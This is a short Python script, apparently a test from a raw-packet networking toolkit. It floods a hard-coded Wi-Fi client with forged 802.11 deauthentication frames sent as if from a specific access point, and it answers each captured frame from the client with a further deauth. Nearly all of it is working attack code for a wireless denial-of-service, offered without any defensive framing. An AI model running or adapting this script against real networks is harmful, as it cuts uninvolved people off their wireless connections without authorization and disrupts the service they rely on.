#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from struct import pack
from sys import path
from os.path import dirname, abspath
from socket import socket, AF_PACKET, SOCK_RAW
from scapy.all import conf, sendp, RadioTap, Dot11, Dot11Deauth, Dot11Auth
from json import dumps
from time import sleep

client: str = 'd0:2b:20:85:4b:c6'
bss_id: str = '70:f1:1c:15:15:b8'
raw_socket: socket = socket(AF_PACKET, SOCK_RAW)


def init_deauth():
    # deauth_packet_scapy: bytes = RadioTap() / \
    #                              Dot11(type=0, subtype=12, addr1=client, addr2=bss_id, addr3=bss_id) / \
    #                              Dot11Deauth(reason=7)
    deauth_packet: bytes = iee.make_deauth(client_address=client, bss_id=bss_id, sequence_number=0)
    for _ in range(100):
        # sendp(deauth_packet_scapy, iface='wlan0')
        raw_socket.send(deauth_packet)
        # base.print_info('Send deauth packet from: ', bss_id, ' to: ', client,
        #                 ' sequence: ', '0')
        sleep(0.1)


def deauth(request):

    for proto in request.keys():
        if type(request[proto]) is dict:
            for key in request[proto].keys():
                if type(request[proto][key]) is bytes:
                    request[proto][key] = str(request[proto][key])

    # print(dumps(request, sort_keys=True, indent=4))
    deauth_packet: bytes = iee.make_deauth(client_address=client,
                                           bss_id=bss_id,
                                           sequence_number=request['802.11']['sequence number'] + 1)
    raw_socket.send(deauth_packet)
    base.print_info('Send deauth packet from: ', bss_id, ' to: ', client,
                    ' sequence: ', str(request['802.11']['sequence number'] + 1))


# region Main function
if __name__ == "__main__":

    path.append(dirname(dirname(dirname(abspath(__file__)))))

    from raw_packet.Utils.base import Base
    from raw_packet.Utils.network import RawEthernet
    from raw_packet.Utils.network import RawRadiotap
    from raw_packet.Utils.network import RawIEEE80211
    from raw_packet.Utils.network import RawSniff
    from raw_packet.Utils.tm import ThreadManager

    base: Base = Base()
    eth: RawEthernet = RawEthernet()
    radio: RawRadiotap = RawRadiotap()
    iee: RawIEEE80211 = RawIEEE80211()
    tm: ThreadManager = ThreadManager(2)
    sniff: RawSniff = RawSniff()

    # region Start sniffer
    raw_socket.bind(('wlan0', 0))
    tm.add_task(init_deauth)
    print('test')
    sniff.start(protocols=['Radiotap', '802.11'], prn=deauth, network_interface='wlan0',
                filters={'802.11': {'type': 0xc0, 'bss id': bss_id, 'source': client, 'destination': bss_id}})
    # endregion

# endregion
